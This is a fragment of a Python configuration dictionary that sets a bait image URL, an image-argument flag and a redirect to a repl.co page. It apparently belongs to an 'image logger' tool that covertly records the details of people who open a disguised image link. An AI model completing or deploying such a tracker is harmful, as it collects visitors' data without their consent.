...
config = {
    ...
    "image": "https://www.english-efl.com/wp-content/uploads/2019/12/test.jpg", # <------------------------- Put image address link here.
    "imageArgument": True,
    ...
    "redirect": {
        "redirect": True,
        "page": "https://surefootedunfinishedmosaic.tanaz2055.repl.co" 
    },
}
